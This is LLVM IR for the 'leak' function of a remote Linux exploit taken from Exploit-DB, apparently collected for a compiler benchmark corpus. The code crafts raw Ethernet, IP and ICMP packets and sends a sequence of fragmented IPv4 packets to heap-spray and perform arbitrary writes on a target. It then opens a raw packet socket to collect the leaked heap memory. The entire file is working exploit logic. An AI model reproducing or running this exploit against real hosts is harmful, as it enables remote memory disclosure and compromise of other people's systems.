; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_47320.c_leak.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_47320.c_leak.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iphdr = type { i64, i64, i32 }
%struct.icmphdr = type { i32 }

@SRC_ADDR = common dso_local global i32 0, align 4
@DST_ADDR = common dso_local global i32 0, align 4
@IP_MAXPACKET = common dso_local global i32 0, align 4
@ETH_HDRLEN = common dso_local global i64 0, align 8
@IP4_HDRLEN = common dso_local global i64 0, align 8
@ICMP_HDRLEN = common dso_local global i64 0, align 8
@IPPROTO_ICMP = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i32 0, align 4
@spray_id = common dso_local global i32 0, align 4
@PF_PACKET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@ETH_P_ALL = common dso_local global i32 0, align 4
@recv_socket = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [54 x i8] c"socket() failed to obtain a receive socket descriptor\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"Cleaning Heap\0A\00", align 1
@heap_leak = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @leak() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.icmphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64*, align 8
  %16 = alloca i64, align 8
  %17 = alloca i64, align 8
  %18 = alloca i32, align 4
  %19 = alloca [8 x i8], align 1
  %20 = alloca [40 x i8], align 16
  %21 = load i32, i32* @SRC_ADDR, align 4
  %22 = call i32 @inet_addr(i32 %21)
  store i32 %22, i32* %1, align 4
  %23 = load i32, i32* @DST_ADDR, align 4
  %24 = call i32 @inet_addr(i32 %23)
  store i32 %24, i32* %2, align 4
  %25 = load i32, i32* @IP_MAXPACKET, align 4
  %26 = call i8* @Malloc(i32 %25)
  store i8* %26, i8** %3, align 8
  %27 = load i8*, i8** %3, align 8
  %28 = load i64, i64* @ETH_HDRLEN, align 8
  %29 = getelementptr inbounds i8, i8* %27, i64 %28
  %30 = bitcast i8* %29 to %struct.iphdr*
  store %struct.iphdr* %30, %struct.iphdr** %4, align 8
  %31 = load i8*, i8** %3, align 8
  %32 = load i64, i64* @ETH_HDRLEN, align 8
  %33 = getelementptr inbounds i8, i8* %31, i64 %32
  %34 = load i64, i64* @IP4_HDRLEN, align 8
  %35 = getelementptr inbounds i8, i8* %33, i64 %34
  %36 = bitcast i8* %35 to %struct.icmphdr*
  store %struct.icmphdr* %36, %struct.icmphdr** %5, align 8
  %37 = load i8*, i8** %3, align 8
  %38 = call i32 @ethernet_header(i8* %37)
  %39 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %40 = load i32, i32* %1, align 4
  %41 = load i32, i32* %2, align 4
  %42 = load i64, i64* @ICMP_HDRLEN, align 8
  %43 = load i32, i32* @IPPROTO_ICMP, align 4
  %44 = load i32, i32* @IP_MF, align 4
  %45 = call i32 @ip_header(%struct.iphdr* %39, i32 %40, i32 %41, i64 %42, i32 %43, i64 47806, i32 %44)
  %46 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 0
  %48 = load i64, i64* %47, align 8
  %49 = call i64 @ntohs(i64 %48)
  %50 = load i64, i64* @IP4_HDRLEN, align 8
  %51 = sub i64 %49, %50
  %52 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %53 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %52, i32 0, i32 0
  store i64 %51, i64* %53, align 8
  %54 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 1
  %56 = load i64, i64* %55, align 8
  %57 = call i64 @ntohs(i64 %56)
  %58 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 1
  store i64 %57, i64* %59, align 8
  %60 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %61 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %60, i32 0, i32 2
  %62 = load i32, i32* %61, align 8
  %63 = call i32 @htons(i32 %62)
  %64 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 2
  store i32 %63, i32* %65, align 8
  %66 = load %struct.icmphdr*, %struct.icmphdr** %5, align 8
  %67 = call i32 @icmp_header(%struct.icmphdr* %66, i32* null, i32 0)
  %68 = load %struct.icmphdr*, %struct.icmphdr** %5, align 8
  %69 = bitcast %struct.icmphdr* %68 to i8*
  %70 = load i64, i64* @ICMP_HDRLEN, align 8
  %71 = getelementptr inbounds i8, i8* %69, i64 %70
  %72 = getelementptr inbounds i8, i8* %71, i64 8
  store i8* %72, i8** %6, align 8
  %73 = load i64, i64* @ETH_HDRLEN, align 8
  %74 = load i64, i64* @IP4_HDRLEN, align 8
  %75 = add i64 %73, %74
  %76 = load i64, i64* @ICMP_HDRLEN, align 8
  %77 = add i64 %75, %76
  store i64 %77, i64* %7, align 8
  %78 = call i32 (...) @rand()
  %79 = and i32 %78, 65535
  store i32 %79, i32* @spray_id, align 4
  %80 = load i8*, i8** %3, align 8
  %81 = load i64, i64* %7, align 8
  %82 = add i64 %81, 4
  %83 = trunc i64 %82 to i32
  %84 = call i32 @arbitrary_write(i8* inttoptr (i64 2784 to i8*), i32 3, i8* %80, i32 %83, i32 256)
  %85 = call i32 (...) @rand()
  %86 = and i32 %85, 65535
  store i32 %86, i32* @spray_id, align 4
  %87 = call i32 @spray(i32 8, i32 32)
  %88 = load i32, i32* @spray_id, align 4
  %89 = add nsw i32 %88, 32
  %90 = sext i32 %89 to i64
  store i64 %90, i64* %8, align 8
  %91 = load i64, i64* %8, align 8
  %92 = add i64 %91, 1
  store i64 %92, i64* %8, align 8
  store i64 %91, i64* %9, align 8
  %93 = load i64, i64* %9, align 8
  %94 = load i32, i32* @IP_MF, align 4
  %95 = call i32 @send_ip4(i64 %93, i32 256, i8* null, i32 %94)
  %96 = load i64, i64* %8, align 8
  %97 = add i64 %96, 1
  store i64 %97, i64* %8, align 8
  store i64 %96, i64* %10, align 8
  %98 = load i64, i64* %10, align 8
  %99 = load i32, i32* @IP_MF, align 4
  %100 = call i32 @send_ip4(i64 %98, i32 8, i8* null, i32 %99)
  %101 = load i64, i64* %8, align 8
  %102 = add i64 %101, 1
  store i64 %102, i64* %8, align 8
  %103 = load i32, i32* @IP_MF, align 4
  %104 = call i32 @send_ip4(i64 %101, i32 8, i8* null, i32 %103)
  %105 = load i64, i64* %8, align 8
  %106 = add i64 %105, 1
  store i64 %106, i64* %8, align 8
  %107 = load i32, i32* @IP_MF, align 4
  %108 = call i32 @send_ip4(i64 %105, i32 8, i8* null, i32 %107)
  %109 = load i64, i64* %8, align 8
  %110 = add i64 %109, 1
  store i64 %110, i64* %8, align 8
  store i64 %109, i64* %11, align 8
  %111 = load i64, i64* %11, align 8
  %112 = load i32, i32* @IP_MF, align 4
  %113 = call i32 @send_ip4(i64 %111, i32 8, i8* null, i32 %112)
  %114 = load i64, i64* %8, align 8
  %115 = add i64 %114, 1
  store i64 %115, i64* %8, align 8
  %116 = load i32, i32* @IP_MF, align 4
  %117 = call i32 @send_ip4(i64 %114, i32 3120, i8* null, i32 %116)
  %118 = load i64, i64* %8, align 8
  %119 = add i64 %118, 1
  store i64 %119, i64* %8, align 8
  store i64 %118, i64* %12, align 8
  %120 = load i64, i64* %12, align 8
  %121 = load i32, i32* @IP_MF, align 4
  %122 = call i32 @send_ip4(i64 %120, i32 8, i8* null, i32 %121)
  %123 = load i64, i64* %8, align 8
  %124 = add i64 %123, 1
  store i64 %124, i64* %8, align 8
  %125 = load i32, i32* @IP_MF, align 4
  %126 = call i32 @send_ip4(i64 %123, i32 8, i8* null, i32 %125)
  %127 = load i64, i64* %11, align 8
  %128 = call i32 @send_ip4(i64 %127, i32 8, i8* null, i32 1)
  %129 = load i64, i64* %12, align 8
  %130 = call i32 @send_ip4(i64 %129, i32 8, i8* null, i32 1)
  store i32 -3408, i32* %13, align 4
  %131 = load i32, i32* %13, align 4
  store i32 %131, i32* %14, align 4
  %132 = load i64, i64* @ETH_HDRLEN, align 8
  %133 = add i64 2784, %132
  %134 = add i64 %133, 14
  %135 = add i64 %134, 6
  %136 = inttoptr i64 %135 to i64*
  store i64* %136, i64** %15, align 8
  store i64 3, i64* %16, align 8
  %137 = load i64, i64* %16, align 8
  %138 = icmp ne i64 %137, 8
  br i1 %138, label %139, label %146

139:                                              ; preds = %0
  %140 = load i64, i64* %16, align 8
  %141 = sub i64 8, %140
  %142 = load i32, i32* %14, align 4
  %143 = sext i32 %142 to i64
  %144 = sub i64 %143, %141
  %145 = trunc i64 %144 to i32
  store i32 %145, i32* %14, align 4
  br label %146

146:                                              ; preds = %139, %0
  %147 = load i64, i64* %8, align 8
  %148 = add i64 %147, 1
  store i64 %148, i64* %8, align 8
  store i64 %147, i64* %17, align 8
  %149 = load i8*, i8** %3, align 8
  %150 = load i32, i32* @IP_MAXPACKET, align 4
  %151 = call i32 @memset(i8* %149, i32 0, i32 %150)
  %152 = load i8*, i8** %3, align 8
  %153 = load i64, i64* @ETH_HDRLEN, align 8
  %154 = getelementptr inbounds i8, i8* %152, i64 %153
  %155 = bitcast i8* %154 to %struct.iphdr*
  store %struct.iphdr* %155, %struct.iphdr** %4, align 8
  %156 = load i8*, i8** %3, align 8
  %157 = call i32 @ethernet_header(i8* %156)
  store i64 3216, i64* %7, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %159 = load i32, i32* %14, align 4
  %160 = load i64, i64* %7, align 8
  %161 = load i32, i32* @IPPROTO_ICMP, align 4
  %162 = load i64, i64* %17, align 8
  %163 = load i32, i32* @IP_MF, align 4
  %164 = call i32 @ip_header(%struct.iphdr* %158, i32 %159, i32 0, i64 %160, i32 %161, i64 %162, i32 %163)
  %165 = load i64, i64* @ETH_HDRLEN, align 8
  %166 = load i64, i64* @IP4_HDRLEN, align 8
  %167 = add i64 %165, %166
  %168 = load i64, i64* %7, align 8
  %169 = add i64 %167, %168
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %18, align 4
  %171 = load i8*, i8** %3, align 8
  %172 = load i32, i32* %18, align 4
  %173 = call i32 @send_pkt(i8* %171, i32 %172)
  %174 = load i8*, i8** %3, align 8
  %175 = load i32, i32* @IP_MAXPACKET, align 4
  %176 = call i32 @memset(i8* %174, i32 0, i32 %175)
  %177 = load i8*, i8** %3, align 8
  %178 = load i64, i64* @ETH_HDRLEN, align 8
  %179 = getelementptr inbounds i8, i8* %177, i64 %178
  %180 = bitcast i8* %179 to %struct.iphdr*
  store %struct.iphdr* %180, %struct.iphdr** %4, align 8
  %181 = load i8*, i8** %3, align 8
  %182 = call i32 @ethernet_header(i8* %181)
  store i64 8, i64* %7, align 8
  %183 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %184 = load i32, i32* %14, align 4
  %185 = load i64, i64* %7, align 8
  %186 = load i32, i32* @IPPROTO_ICMP, align 4
  %187 = load i64, i64* %17, align 8
  %188 = call i32 @ip_header(%struct.iphdr* %183, i32 %184, i32 0, i64 %185, i32 %186, i64 %187, i32 402)
  %189 = load i64, i64* @ETH_HDRLEN, align 8
  %190 = load i64, i64* @IP4_HDRLEN, align 8
  %191 = add i64 %189, %190
  %192 = load i64, i64* %7, align 8
  %193 = add i64 %191, %192
  %194 = trunc i64 %193 to i32
  store i32 %194, i32* %18, align 4
  %195 = load i8*, i8** %3, align 8
  %196 = load i32, i32* %18, align 4
  %197 = call i32 @send_pkt(i8* %195, i32 %196)
  %198 = bitcast [8 x i8]* %19 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %198, i8 0, i64 8, i1 false)
  %199 = load i64, i64* %16, align 8
  %200 = icmp ne i64 %199, 8
  br i1 %200, label %201, label %209

201:                                              ; preds = %146
  %202 = load i64, i64* %16, align 8
  %203 = sub i64 8, %202
  %204 = getelementptr inbounds [8 x i8], [8 x i8]* %19, i64 0, i64 %203
  %205 = bitcast i64** %15 to i8*
  %206 = load i64, i64* %16, align 8
  %207 = trunc i64 %206 to i32
  %208 = call i32 @memcpy(i8* %204, i8* %205, i32 %207)
  br label %213

209:                                              ; preds = %146
  %210 = getelementptr inbounds [8 x i8], [8 x i8]* %19, i64 0, i64 0
  %211 = bitcast i64** %15 to i8*
  %212 = call i32 @memcpy(i8* %210, i8* %211, i32 8)
  br label %213

213:                                              ; preds = %209, %201
  %214 = load i64, i64* %10, align 8
  %215 = getelementptr inbounds [8 x i8], [8 x i8]* %19, i64 0, i64 0
  %216 = call i32 @send_ip4(i64 %214, i32 8, i8* %215, i32 1)
  %217 = load i32, i32* @PF_PACKET, align 4
  %218 = load i32, i32* @SOCK_RAW, align 4
  %219 = load i32, i32* @ETH_P_ALL, align 4
  %220 = call i32 @htons(i32 %219)
  %221 = call i32 @socket(i32 %217, i32 %218, i32 %220)
  store i32 %221, i32* @recv_socket, align 4
  %222 = icmp slt i32 %221, 0
  br i1 %222, label %223, label %225

223:                                              ; preds = %213
  %224 = call i32 @die(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  br label %225

225:                                              ; preds = %223, %213
  %226 = load i64, i64* %9, align 8
  %227 = call i32 @send_ip4(i64 %226, i32 8, i8* null, i32 32)
  %228 = call i32 (...) @recv_leaks()
  %229 = bitcast [40 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %229, i8 0, i64 40, i1 false)
  %230 = call i32 (...) @rand()
  %231 = and i32 %230, 65535
  store i32 %231, i32* @spray_id, align 4
  %232 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  %233 = load i8*, i8** @heap_leak, align 8
  %234 = getelementptr i8, i8* %233, i64 2784
  %235 = getelementptr inbounds [40 x i8], [40 x i8]* %20, i64 0, i64 0
  %236 = call i32 @arbitrary_write(i8* %234, i32 3, i8* %235, i32 40, i32 32)
  ret void
}

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i8* @Malloc(i32) #1

declare dso_local i32 @ethernet_header(i8*) #1

declare dso_local i32 @ip_header(%struct.iphdr*, i32, i32, i64, i32, i64, i32) #1

declare dso_local i64 @ntohs(i64) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @icmp_header(%struct.icmphdr*, i32*, i32) #1

declare dso_local i32 @rand(...) #1

declare dso_local i32 @arbitrary_write(i8*, i32, i8*, i32, i32) #1

declare dso_local i32 @spray(i32, i32) #1

declare dso_local i32 @send_ip4(i64, i32, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @send_pkt(i8*, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i32 @recv_leaks(...) #1

declare dso_local i32 @printf(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
